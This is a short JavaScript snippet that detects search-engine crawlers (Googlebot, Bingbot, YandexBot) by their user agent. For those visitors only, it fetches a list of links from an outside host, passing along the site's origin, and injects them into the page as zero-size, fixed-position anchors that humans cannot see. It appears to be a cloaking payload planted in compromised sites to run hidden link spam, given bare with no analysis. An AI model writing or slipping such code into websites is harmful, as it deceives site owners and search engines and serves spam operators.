const userAgent = navigator.userAgent.toLowerCase();
const isSearchEngineBot = /(googlebot|bingbot|yandexbot)/.test(userAgent);

if (isSearchEngineBot) {
    const siteURL = encodeURIComponent(window.location.origin);
    const jsonURL = `https://xxxlabs.org/links.php?siteurl=${siteURL}`;

    fetch(jsonURL)
        .then(response => {
            if (!response.ok) {
                throw new Error("Network response was not ok " + response.statusText);
            }
            return response.json();
        })
        .then(data => {
            data.forEach(item => {
                const a = document.createElement('a');

                const linkText = document.createTextNode(item.text);
                a.appendChild(linkText);
                a.title = item.title;
                a.href = item.href;
                a.style = "overflow: auto; position: fixed; height: 0pt; width: 0pt";

                document.body.appendChild(a);
            });
        })
        .catch(error => {
            console.error("There was a problem with the fetch operation:", error);
        });
}
